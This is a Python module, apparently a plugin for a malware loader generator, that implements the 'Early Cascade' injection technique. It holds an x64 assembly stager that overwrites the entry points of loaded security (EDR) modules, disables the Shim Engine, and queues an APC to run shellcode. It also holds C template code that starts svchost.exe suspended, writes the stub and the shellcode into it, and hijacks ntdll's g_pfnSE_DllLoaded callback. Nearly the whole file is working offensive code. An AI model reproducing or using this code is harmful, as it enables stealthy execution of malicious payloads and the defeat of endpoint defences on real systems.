from string import Template
import tempfile
import os
import subprocess
from c.utils.formatters import bytes_to_c

class earlycascade:
    def __init__(self, arguments):
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        fd, file_path = tempfile.mkstemp()
        self.outfd, self.outfile_path = tempfile.mkstemp()
        with os.fdopen(fd, 'w') as f:
            inline_assembly = """
;-------------------------------------------------------;
;   Author  => Abdallah Mohamed ( 0xNinjaCyclone )      ;
;   Email   => elsharifabdallah53@gmail.com             ;
;   Date    => January 7, 2025                          ;
;   Compile => nasm -f bin -O3 -o stager.bin stager.asm     ;
;-------------------------------------------------------;


[BITS 64]

cascade:
    push rsi                            ; Save the source register
    push rdi                            ; Save the dest register
    mov rdx, qword gs:[60h]             ; Getting Process Environment Block Address ( PPEB )
    mov rdx, qword [rdx+18h]            ; Fetching the Loader data address ( PPEB->Ldr )
    lea rdx, qword [rdx+20h]            ; Load MemoryOrderList Address
    push rdx                            ; Pushing it onto stack
    mov rdx, qword [rdx]                ; We are skipping the main module

preempt_edr:
    mov rdx, qword [rdx]                ; Next module
    cmp rdx, qword [rsp]                ; Check if we've done a full circuit round
    je preempt_done
    mov rsi, qword [rdx+50h]            ; Current DLL name
    movzx rcx, word [rdx+4Ah]           ; Length of DLL name
    add rcx, 0ah                        ; For f*cking NUL & Alignment
    and rcx, 0FFFFFFFFFFFFFFF0h         ; Ensuring alignment
    sub rsp, rcx                        ; Momory for the ANSI version
    mov r9, rcx                         ; Save the size of reserved memory
    xor rcx, rcx                        ; Clear the counter

adjust_name:
    xor rax, rax                        ; Clear the buffer
    lodsw                               ; We need to read as word 
    cmp al, ah                          ; Is that a NUL?
    jz hunt_edr                         ; We are ready!
    cmp al, 61h                         ; Hashes calculated in lower case, so we have to check
    jge str_lower                       ; Current char looks like in upper case? 
    cmp al, 41h                         ; Maybe a dot or something else (ensure that)
    jl str_lower                        ; Yep, we should not pay attention to it
    add al, 20h                         ; Nope?, convert it. 

str_lower:
    mov byte [rsp+rcx], al              ; Write the character into the buffer
    inc rcx                             ; Increamenting the counter
    jmp adjust_name                     ; Keep adjusting

hunt_edr:
    mov byte [rsp+rcx], 0               ; Mark the end of the string
    mov rsi, rsp                        ; Now, rsi is a pointer to the ANSI string
    call str_hash                       ; Compute the hash
    add rsp, r9                         ; We don't need that string anymore 
    mov rsi, 377D2B522D3B5EDh           ; hashing result of "ntdll.dll"
    cmp rsi, rdi                        ; Check if current module is NtDLL 
    je preempt_edr                      ; Yes?, that's allowed
    mov rsi, 0D537E9367040EE75h         ; hashing result of "kernel32.dll"
    cmp rsi, rdi                        
    je preempt_edr
    mov rsi, 2D71274A721952Bh           ; hashing result of "kernelbase.dll"
    cmp rsi, rdi
    je preempt_edr

    ; EDR Tools wanna mess with us, let's hijacking it!
    call edr_clobbering
    jmp just_return_zero

edr_clobbering: ; No other modules supposed to be loaded that early
    pop rax                             ; Own procedure for redirecting EDRs to
    mov qword [rdx+30h], rax            ; Kicking EDRs entrypoints off
    jmp preempt_edr                     ; Don't stop until clobbering all

preempt_done:
    pop rdx                             ; Restore the MemoryOrderList
    mov rax, 1111111111111111h          ; Pointer to g_ShimsEnabled flag
    mov byte [rax], 0h                  ; Disable Shim Engine
    mov rdx, qword [rdx]                ; We points now to the main entry
    mov rdx, qword [rdx]                ; Jump into the entry of NtDLL
    mov rdx, qword [rdx+20h]            ; NtDLL Base Address
    xor rax, rax                        ; Clear the accumulator register
    mov eax, dword [rdx+3Ch]            ; Getting Image NT Headers RVA
    add rax, rdx                        ; Jump into the Image NT Headers
    cmp word [rax+0x18], 020Bh          ; Checking "Machine" member in the File Header
    jne finish
    mov eax, dword [rax+88h]            ; Getting Export Tables RVA from Data Directory Table
    add rax, rdx                        ; Jump into there
    push rax                            ; Save Export Tables Address
    xor r11, r11                        ; Clear the register
    mov r11d, dword [rax+20h]           ; Export Name Table RVA ( ENT )
    add r11, rdx                        ; Jump into there
    xor rcx, rcx                        ; Clear the counter register
    mov ecx, dword [rax+18h]            ; Number of functions
    push rcx                            ; Save the number of functions to be used later

find_queueapc_api:
    test rcx, rcx                       ; Check the end of the table
    jz api_notfound                     ; We f*cked up, "NtQueueApcThread" cannot be found!
    xor rsi, rsi                        ; Clear the source
    mov esi, dword [r11]                ; Looking up the ENT
    add rsi, rdx                        ; Getting a pointer to the function name
    call str_hash                       ; Calculating the hash of current function name

check_function:
    add r11, 4h                         ; Jump into the next entry in the table
    dec rcx                             ; Decrement our counter
    mov rsi, 9963DF7CD4612238h          ; DJB2 Hash of "NtQueueApcThread"
    cmp rsi, rdi                        ; Compare with the API we search for
    jne find_queueapc_api
    pop rax                             ; Restoring the number of functions
    inc ecx                             ; We need to make the ecx equal to the remaining exports+1
    sub eax, ecx                        ; Calculating the desired ordinal index
    xchg eax, ecx                       ; Just toggling
    pop rax                             ; Restoring the Export Tables Address
    mov r11d, dword [rax+24h]           ; Export Ordinal Table RVA 
    add r11, rdx                        ; Jump into there 
    mov cx, word [r11+2h*rcx]           ; Fetching the ordinal
    mov r11d, dword [rax+1ch]           ; Export Address Table RVA ( EAT )
    add r11, rdx                        ; Jump into there 
    mov eax, dword [r11+4h*rcx]         ; Fetching the function RVA
    add rax, rdx                        ; Finally, we have the API Address
    jmp shellcode

fire:
    mov rcx, -2                         ; ThreadHandle ( Current thread )
    pop rdx                             ; ApcRoutine ( Shellcode address )
    xor r8, r8                          ; ApcRoutineContext ( NULL )
    xor r9, r9                          ; ApcStatusBlock ( NULL )
    push r9                             ; ApcReserved ( NULL )
    push r9                             ; Alignment
    sub rsp, 20h                        ; Reserve ( sizeof(QWORD) * 4 )
    call rax                            ; Invoke "NtQueueApcThread"
    add rsp, 30h                        ; Clear off the stack

finish:
    pop rdi
    pop rsi

just_return_zero:
    xor rax, rax
    ret

api_notfound:
    pop rcx
    pop rax
    jmp finish

str_hash:
    mov rdi, 5381                       ; DJB2 Magic

compute_hash: ; DJB2 Hashing Algorithm
    xor rax, rax                        ; rax is utilized to reads the string
    lodsb                               ; Fetch a charecter
    cmp al, ah                          ; End of the string!?
    je hash_computed                    ; Don3, go back to the caller
    mov r8, rdi                         ; Save the computed value
    shl rdi, 5                          ; Value << 5
    add rdi, r8                         ; Value += OldValue
    add rdi, rax                        ; Value += ASCII(c)
    jmp compute_hash

hash_computed:
    ret

shellcode:
    call fire

"""
            f.write(inline_assembly)
        result = subprocess.run(['nasm', '-f', 'bin','-O3', file_path, '-o', self.outfile_path])
        os.unlink(file_path)
        with open(self.outfile_path, 'rb') as f:
            self.stagerBytes = f.read()
        os.unlink(self.outfile_path)
        self.stubSize = len(self.stagerBytes)

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return f"""
{bytes_to_c(self.stagerBytes, 'x64_stub', False)}

LPVOID encode_system_ptr(LPVOID ptr) {{
    // get pointer cookie from SharedUserData!Cookie (0x330)
    ULONG cookie = *(ULONG*)0x7FFE0330;

    // encrypt our pointer so it'll work when written to ntdll
    return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}}

LPVOID find_pattern(LPBYTE pBuffer, DWORD dwSize, LPBYTE pPattern, DWORD dwPatternSize)
{{
    if ( dwSize > dwPatternSize ) // Avoid OOB
        while ( (dwSize--) - dwPatternSize ) {{
            if ( RtlCompareMemory(pBuffer, pPattern, dwPatternSize) == dwPatternSize ){{
                return pBuffer;
            }}
            pBuffer++;
        }}
    return NULL;
}}

LPVOID find_SE_DllLoadedAddress(HANDLE hNtDLL, LPVOID *ppOffsetAddress) {{
    DWORD dwValue;
    DWORD_PTR dwPtr;
    DWORD_PTR dwTextPtr;
    DWORD_PTR dwMRDataPtr;
    DWORD_PTR dwResultPtr;

    /* Nt Headers */
    dwPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_DOS_HEADER) hNtDLL)->e_lfanew;

    /* Get the number of ntdll sections */
    dwValue = ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.NumberOfSections;

    /* The beginning of the section headers */
    dwPtr = (DWORD_PTR) &((PIMAGE_NT_HEADERS) dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.SizeOfOptionalHeader;

    while ( dwValue-- ) {{
        /* Save .text section header */
        if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".text") == 0 )
            dwTextPtr = dwPtr;

        /* Find .mrdata section address */
        if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".mrdata") == 0 )
            dwMRDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;    

        /* Next section header */
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }}

    /* Points to the beginning of .text section */
    dwResultPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwTextPtr)->VirtualAddress;

    /* The end of .text section */
    dwTextPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER) dwTextPtr)->Misc.VirtualSize;

    /*
        We are searching for this pattern:
        8b14253003fe7f       mov     edx, dword ptr [7FFE0330h]
        8bc2                 mov     eax, edx
        488b3d??????00       mov     rdi, qword ptr [ntdll!g_pfnSE_DllLoaded (????????????)]
    */

    while ( dwResultPtr = (DWORD_PTR) find_pattern((LPBYTE) dwResultPtr, dwTextPtr-dwResultPtr, "\\x8B\\x14\\x25\\x30\\x03\\xFE\\x7F\\x8B\\xC2\\x48\\x8B", 11) ) {{
        /* Get the offset address */
        dwResultPtr += 12;

        /* Ensure the validity of the opcode we rely on */
        if ( (*(BYTE *)(dwResultPtr + 0x3)) == 0x00 ) {{
            /* Set the offset address */
            if ( ppOffsetAddress )
                ( *ppOffsetAddress ) = (LPVOID) dwResultPtr;

            /* Fetch the address */
            dwPtr = (DWORD_PTR) ( *(DWORD32 *) dwResultPtr ) + dwResultPtr + 0x4;

            /* Is that address in the range we expect!? */
            if ( dwPtr > dwMRDataPtr+0x240 && dwPtr < dwMRDataPtr+0x280 )
                return (LPVOID) dwPtr;
        }}
    }}

    return NULL;
}}

LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {{
    DWORD dwValue;
    DWORD_PTR dwPtr;
    DWORD_PTR dwResultPtr;
    DWORD_PTR dwEndPtr;
    DWORD_PTR dwDataPtr;

    /* Nt Headers */
    dwPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_DOS_HEADER) hNtDLL)->e_lfanew;

    /* Get the number of ntdll sections */
    dwValue = ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.NumberOfSections;

    /* The beginning of the section headers */
    dwPtr = (DWORD_PTR) &((PIMAGE_NT_HEADERS) dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.SizeOfOptionalHeader;

    while (dwValue--) {{
        /* Find .data section address */
        if (strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".data") == 0) {{
            dwDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;  
            printf("[DEBUG] .data section found at address: 0x%p\\n", (LPVOID)dwDataPtr);
            break; 
        }}

        /* Next section header */
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }}

    if (!dwDataPtr) {{
        printf("[ERROR] .data section not found!\\n");
        return NULL;
    }}

    /* Searching from the address where we found the offset of SE_DllLoadedAddress */
    dwPtr = dwEndPtr = (DWORD_PTR) pDllLoadedOffsetAddress;

    /* End of block we are searching in */
    dwEndPtr += 0xFF;

    printf("[DEBUG] Scanning .data section from: 0x%p to 0x%p\\n", (LPVOID)dwPtr, (LPVOID)dwEndPtr);

    /*
        We are looking for this pattern:
        443825??????00       cmp     byte ptr [ntdll!g_ShimsEnabled (????????????)], r12b
    */

    while (dwPtr = (DWORD_PTR) find_pattern((LPBYTE)dwPtr, dwEndPtr - dwPtr, "\\x44\\x38\\x25", 3)) {{
        /* Jump into the offset */
        dwPtr += 0x3;
        
        /* Ensure the validity of the opcode we rely on */
        if ((*(BYTE *)(dwPtr + 0x3)) == 0x00) {{
            /* Fetch the address - Server 2019 fix*/ 
            dwResultPtr = (DWORD_PTR)(*(DWORD32 *)dwPtr) + dwPtr + 0x4;            

            /* Debug information - Server 2019 fix*/
            printf("[DEBUG] Pattern found at: 0x%p\\n", (LPVOID)(dwPtr - 0x3));
            printf("[DEBUG] Opcode at offset 0x3: 0x%02x\\n", *(BYTE *)(dwPtr + 0x3));
            printf("[DEBUG] Candidate address: 0x%p\\n", (LPVOID)dwResultPtr);

            /* Is that address in the range we expect!? - Server 2019 fix*/
            if (dwResultPtr > dwDataPtr && dwResultPtr < dwDataPtr + 0x8000) {{
                printf("[DEBUG] Valid g_ShimsEnabled address found at: 0x%p\\n", (LPVOID)dwResultPtr);
                return (LPVOID)dwResultPtr;
            }} else {{
                printf("[DEBUG] Candidate address rejected: 0x%p\\n", (LPVOID)dwResultPtr);
            }}
        }}
    }}

    printf("[ERROR] Failed to locate g_ShimsEnabled address!\\n");
    return NULL;
}}
"""

    def template(self) -> str:
        return Template("""
    HANDLE hNtDLL;
    PROCESS_INFORMATION pi = {{ 0 }};
    STARTUPINFOA si = {{ 0 }};
    LPVOID pBuffer;
    LPVOID pShimsEnabledAddress;
    LPVOID pSE_DllLoadedAddress;
    LPVOID pPtr;
    int nSuccess = EXIT_FAILURE;
    BOOL bEnable = TRUE;

    {transformers}

    si.cb = sizeof( STARTUPINFOA );
        
    printf("[*] Create a process in suspended mode ( %s )\\n", "$target");

    if ( !{CreateProcessA}(
        NULL, 
        "$target", 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED, 
        NULL, 
        (LPCSTR) "C:\\\\Windows\\\\System32\\\\", 
        &si, 
        &pi
    ) )
        return nSuccess;

    puts( "[+] The process has been created successfully" );

    puts( "[*] Getting a handle on NtDLL" );
    hNtDLL = {GetModuleHandleA}( "NtDLL" );
    printf( "[+] NtDLL Base Address = 0x%p\\n", hNtDLL );

    puts( "[*] Dynamically Search for the Callback Pointer Address ( g_pfnSE_DllLoaded )");
    pSE_DllLoadedAddress = find_SE_DllLoadedAddress( hNtDLL, &pPtr );
    printf( "[+] Found the Callback Address at 0x%p\\n", pSE_DllLoadedAddress );

    puts( "[*] Dynamically Search for the Enabling Flag Address ( g_ShimsEnabled )");
    pShimsEnabledAddress = find_ShimsEnabledAddress( hNtDLL, pPtr );
    printf( "[+] Found the Enabling Flag Address at 0x%p\\n", pShimsEnabledAddress );

    do {{

        puts( "[*] Remotley allocate memory for both stub & shellcode" );
        if ( !(pBuffer = {VirtualAllocEx}(pi.hProcess, NULL, $stubSize + {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) )
            break;

        /* Shellcode address */
        pPtr = (LPVOID)( (DWORD_PTR) pBuffer + $stubSize );

        printf( "[+] Our stub will be injected at 0x%p\\n", pBuffer );
        printf( "[+] Our shellcode will be injected at 0x%p\\n", pPtr );

        /* Tell the stub where the enabling flag is located */
        RtlCopyMemory( find_pattern(x64_stub, $stubSize, "\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11", 8), &pShimsEnabledAddress, sizeof(LPVOID) );

        puts( "[*] Injecting our cascade stub" );
        if ( !{WriteProcessMemory}(pi.hProcess, pBuffer, x64_stub, $stubSize, NULL) ){{
            break;
        }}

        puts( "[+] Our stub has been successfully injected into the remote process" );

        puts( "[*] Injecting our Shellcode" );
        if ( !{WriteProcessMemory}(pi.hProcess, (LPVOID)((DWORD_PTR)pBuffer + $stubSize), shellcode, {shellcodeSize}, NULL) )
            break;

        puts( "[+] Our Shellcode has been successfully injected into the remote process" );

        pPtr = encode_system_ptr((LPVOID) pBuffer);
        printf( "[*] The Callback Address has been encoded to 0x%p\\n", pPtr );

        puts ("[*] Hijacking the Callback for making it executes our stub" );
        if ( !{WriteProcessMemory}(pi.hProcess, pSE_DllLoadedAddress, (LPCVOID) &pPtr, sizeof(LPVOID), NULL) )
            break;

        puts( "[+] Hijacking has been done successfully" );

        puts( "[*] Enabling Shim Engine for triggering our stub later" );
        if ( !{WriteProcessMemory}(pi.hProcess, pShimsEnabledAddress, (LPCVOID) &bEnable, sizeof(BOOL), NULL) )
            break;

        puts( "[+] Shim Engine is enabled now" );
        
        puts( "[*] Triggering the callback" );
        if ( !{ResumeThread}(pi.hThread) )
            break;

        puts( "[+] Injection has been done successfully" );
        nSuccess = EXIT_SUCCESS;

    }} while( FALSE );

    if ( nSuccess == EXIT_FAILURE )
        puts( "[-] Unfortunately, failed to cascade the process!" );

    puts( "[*] Cleaning up" );
    if ( pi.hThread )
        {CloseHandle}( pi.hThread );

    if ( pi.hProcess )
        {CloseHandle}( pi.hProcess );
""").substitute(target=self.target, stubSize = self.stubSize)